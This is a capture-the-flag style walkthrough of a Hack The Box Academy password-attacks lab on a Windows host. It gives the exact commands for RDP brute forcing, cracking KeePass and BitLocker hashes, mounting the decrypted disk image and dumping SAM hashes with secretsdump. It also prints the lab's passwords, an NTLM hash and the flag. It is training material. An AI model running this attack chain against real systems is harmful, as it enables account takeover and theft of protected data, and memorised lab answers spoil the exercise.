# Password Attacks Lab - Hard  

[Password Attacks Lab - Hard](https://academy.hackthebox.com/module/147/section/1356)  

>The next host is a Windows-based client. Client would like to make sure that an attacker cannot gain access to any sensitive files in the event of a successful attack. 
>While our colleagues were busy with other hosts on the network, we were able to find out that the user `Johanna` is present on very many hosts.  

## Enumeration  

>NMAP scans and result outputs:  

```
sudo nmap -p 111,135,139,445,2049,3389,5985 10.129.202.222 -sCV -A -O --script vuln

PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINSRV
|   NetBIOS_Domain_Name: WINSRV
|   NetBIOS_Computer_Name: WINSRV
|   DNS_Domain_Name: WINSRV
|   DNS_Computer_Name: WINSRV
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-16T20:22:30+00:00
| ssl-cert: Subject: commonName=WINSRV
| Not valid before: 2023-07-15T20:07:40
|_Not valid after:  2024-01-14T20:07:40
|_ssl-date: 2023-07-16T20:22:38+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-16T20:22:31
|_  start_date: N/A
```  

### RDP

>Using crowbar to brute force passwords for user `johanna` on Remote desktop.
>[Attacking RDP - Remote Desktop Protocol with crowbar](https://academy.hackthebox.com/module/116/section/1171)  

```
crowbar -b rdp -s 10.129.202.222/32 -u johanna -C ../resources/demo-pass.lst
```  

![crowbar-Password-Attacks-Lab-Hard](/images/crowbar-Password-Attacks-Lab-Hard.png)  

>Discovered the password for user `johanna` as `1231234!`. Remote desktop with discovered credentials.  

```
xfreerdp /v:10.129.202.222 /u:johanna /p:1231234! /dynamic-resolution /drive:kali-drive,/home/kali/Downloads/htb/academy/Johanna
```  

>With the dynamic drive mapping via RDP protocol, enable to easy copy of files between kali and the windows victim.  

![xfreerdp-Password-Attacks-Lab-Hard](/images/xfreerdp-Password-Attacks-Lab-Hard.png)  

## Foothold  

>With the foothold as user `Johanna`, copy the keepass database file to kali for cracking.  

```
keepass2john Logins.kdbx >keepass.hash
```

>Using hashcat to crack the extracted password hash.  

```
hashcat.exe -m 13400 s:\hashes\keepass.hash s:\wordlists\mut_password.list -O
```  

>With the obtained password, open the database using rdp session to the target.

![keepass-Password-Attacks-Lab-Hard](/images/keepass-Password-Attacks-Lab-Hard.png)  

## Lateral Movement  

>Obtained credentials from keepass database for the user `david` and his password as `gRzX7YbeTcDG7`.  

>Run `CMD` as user `.\david` and enumerate his files and documents.
>Discover a `backup.vhd` file in David Documents folder.

![vhd-Password-Attacks-Lab-Hard](/images/vhd-Password-Attacks-Lab-Hard.png)  

### Bitlocker password  

>[PASSWORD ATTACKS - Protected Archives](https://academy.hackthebox.com/module/147/section/1323) Using bitlocker2john.  

```
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
```  

>Using John the Ripper or `hashcat` to crack the VHD bitlocker drive password.  

```
john --wordlist=../tiny-pass-list1.txt vhd.hash
```  

```
hashcat.exe -m 22100 s:\hashes\vhd.hash s:\wordlists\mut_password.list -O
```  

>Obtained the encrypted windows 10 drive vhd image file cracked password as `123456789!`

>Mount encrypted VHD bitlocked drive - [Mounting Bit-locker encrypted vhd files in Linux](https://medium.com/@kartik.sharma522/mounting-bit-locker-encrypted-vhd-files-in-linux-4b3f543251f0)  

```
sudo modprobe nbd
sudo qemu-nbd -c /dev/nbd0 backup.vhd
sudo cryptsetup bitlkOpen /dev/nbd0p2 david
```

>Provide the password, `123456789!`.

```
ls -al /dev/mapper/david

mkdir vhd
sudo mount /dev/mapper/david vhd/
```  

![mount-vhd-Password-Attacks-Lab-Hard](/images/mount-vhd-Password-Attacks-Lab-Hard.png)  

>VHD is mapped, and we discovered backup copies of the windows SAM database.  

## Privilege Escalation  

>Using Impacket Secretsdump to extract the Administrator hash credentials.  
>[Attacking SAM database on windows target and cracking NT hashes with hashcat](https://academy.hackthebox.com/module/147/section/1315)

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
```  

>Output hashes:  

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
```  

>Using `-m` to select the hash type as `1000` to crack the NT hashes also referred to as NTLM-based hashes.  

```
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```  

>With the obtained Administrator credentials, RDP to target.

```
xfreerdp /v:10.129.202.222 /u:Administrator /p:Liverp00l8! /dynamic-resolution
```

>HTB{PWcr4ck1ngokokok}  
